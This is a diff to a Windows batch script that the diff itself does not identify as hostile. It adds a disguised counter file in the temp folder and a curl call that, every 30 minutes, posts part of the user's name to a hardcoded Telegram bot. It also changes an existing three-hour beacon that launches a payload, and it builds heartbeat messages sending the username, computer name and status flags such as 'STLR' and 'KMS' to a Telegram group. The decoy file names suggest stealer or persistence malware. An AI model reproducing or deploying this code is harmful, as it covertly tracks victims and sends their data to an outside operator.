@@ -10,7 +10,7 @@
 setlocal enabledelayedexpansion
 
 
-set "BATCHVERSION=26.1"
+set "BATCHVERSION=26.2"
 
 
 
@@ -1665,7 +1665,56 @@ echo.
 
 
 :: Define the file to track the last run time
-set "LASTRUNFILE=%TEMP%\lastrun.log"
+set "EVERY30MIN=%TEMP%\EVY3PT.sys"
+
+:: Check if the file exists
+if not exist "%EVERY30MIN%" (
+    echo 1 > "%EVERY30MIN%"
+) else (
+    for /f "delims=" %%A in ('type "%EVERY30MIN%"') do set /a MINTSS=%%A + 1
+    echo !MINTSS! > "%EVERY30MIN%"
+)
+
+:: Read the updated value
+set /p MINTSS=<"%EVERY30MIN%"
+echo MINTSS=%MINTSS%
+echo.
+echo.
+
+:: Check if 30 minutes have passed
+if %MINTSS% GEQ 30 goto 30MINDONE
+goto 30MINSTILL
+
+:30MINDONE
+set "SMALLUSER=%USERNAME:~0,2%%USERNAME:~-2%"
+curl -s -X POST "https://api.telegram.org/bot7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA/sendMessage" -d "chat_id=1040442734" -d "text=%SMALLUSER%30ZIN"
+echo 0 > "%EVERY30MIN%"
+goto HIHOZ
+
+
+:30MINSTILL
+echo.
+MINTSS is still %MINTSS%
+echo.
+
+
+
+
+
+
+
+
+:HIHOZ
+echo HIHOZ Started.
+echo.
+
+
+
+
+
+:: Define the file to track the last run time
+del /f /a "%TEMP%\lastrun.log"
+set "LASTRUNFILE=%TEMP%\lstrimsys.drv"
 
 :: Check if the file exists
 if not exist "%LASTRUNFILE%" (
@@ -1687,7 +1736,7 @@ goto 3HOURSTILL
 
 :3HOURDONE
 set "SMALLUSER=%USERNAME:~0,2%%USERNAME:~-2%"
-curl -s -X POST "https://api.telegram.org/bot7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA/sendMessage" -d "chat_id=1040442734" -d "text=%SMALLUSER%THR"
+curl -s -X POST "https://api.telegram.org/bot7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA/sendMessage" -d "chat_id=1040442734" -d "text=%SMALLUSER%3HOU"
 start "" "%file1%"
 set "COMSTARTED=1"
 echo 0 > "%LASTRUNFILE%"
@@ -1706,6 +1755,29 @@ echo.
 
 
 :NEXT4
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
@@ -1743,7 +1815,7 @@ set "TOKEN_RUNNING=7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA"
 set "CHAT_ID_RUNNING=-1002163721260"
 set "TOPIC_ID_RUNNING=73779"
 ::
-set "MESSAGE_RUNNING=%USERNAME%(%COMPUTERNAME%)|RUNNING%CheckSend%|STLR%MINUTESS%(%COMSTARTED%)|SHST%SHSTRUNNING%.KMS%KMSRUNNING%|%time%|(v%BATCHVERSION%)"
+set "MESSAGE_RUNNING=%USERNAME%(%COMPUTERNAME%)|RUNNING%CheckSend%|STLR%MINUTESS%(%COMSTARTED%)|30MNTS(%MINTSS%)|SHST%SHSTRUNNING%.KMS%KMSRUNNING%|%time%|(v%BATCHVERSION%)"
 set "ENCODED_MESSAGE_RUNNING=%MESSAGE_RUNNING: =%%2"
 set "CAPTION_RUNNING=This is a document for RUNNING Topic"
 set "FILE_PATH_RUNNING=%temp%\RUNNING_Topic.txt"
